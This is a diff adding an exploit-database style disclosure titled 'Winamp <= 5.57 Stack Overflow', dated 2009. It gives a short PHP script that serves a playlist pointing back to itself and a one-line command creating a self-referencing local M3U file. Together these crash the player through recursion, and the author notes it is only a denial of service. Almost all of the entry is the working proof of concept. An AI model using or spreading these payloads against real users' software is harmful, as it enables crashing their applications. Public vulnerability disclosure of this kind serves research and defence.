@@ -1,0 +1,22 @@
+# Exploit Title: Winamp <= 5.57 Stack Overflow
+# Date: 22 Dec 2009
+# Author: scriptjunkie, scriptjunkie.1 {nospam} googlemail {nospam} com
+# Software Link: http://www.winamp.com/media-player
+# Version: 5.57, 5.56
+# Tested on: Windows XP, Windows 7
+# CVE: none at time of writing
+# Code: 
+
+PHP:
+
+<?php 
+header("Content-type: audio/x-mpegurl");
+echo $_SERVER["SCRIPT_URI"]."/blah.m3u";
+?>
+
+
+
+Local M3U:
+echo "a.m3u" > a.m3u
+
+# OMG WE'RE PWNED: chill, it's not a stack buffer overflow, just a stack overflow. DoS.
